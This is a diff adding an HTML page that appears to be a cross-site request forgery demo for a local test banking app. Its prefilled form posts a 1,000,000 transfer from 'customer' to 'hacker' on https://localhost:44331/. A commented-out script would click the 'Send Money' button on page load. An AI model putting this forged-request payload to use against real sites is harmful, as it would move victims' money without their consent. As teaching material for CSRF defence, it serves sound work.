@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+	</head>
+	<body>
+
+		<form method="post" action="https://localhost:44331/">
+			<h4>Create a new account.</h4>
+			<hr />
+			<div class="text-danger validation-summary-valid" data-valmsg-summary="true">
+				<ul>
+					<li style="display:none"/>
+				</ul>
+			</div>
+			<div class="form-group">
+				<label for="From">From</label>
+				<input class="form-control" type="text" data-val="true" data-val-required="The From field is required." id="From" name="From" value="customer" />
+			</div>
+			<div class="form-group">
+				<label for="To">To</label>
+				<input class="form-control" type="text" data-val="true" data-val-required="The To field is required." id="To" name="To" value="hacker" />
+			</div>
+			<div class="form-group">
+				<label for="Amount">Amount</label>
+				<input class="form-control" type="text" data-val="true" data-val-number="The field Amount must be a number." data-val-required="The Amount field is required." id="Amount" name="Amount" value="1000000" />
+			</div>
+			<div class="form-group">
+				<label for="Reason">Reason</label>
+				<input class="form-control" type="text" data-val="true" data-val-required="The Reason field is required." id="Reason" name="Reason" value="Beacuse you are a fool" />
+			</div>
+			<button type="submit" id="myButton" class="btn btn-default">Send Money</button>
+
+		</div>
+		<script>
+			// document.querySelector("#myButton").click()
+		</script>
+	</body>
+</html>
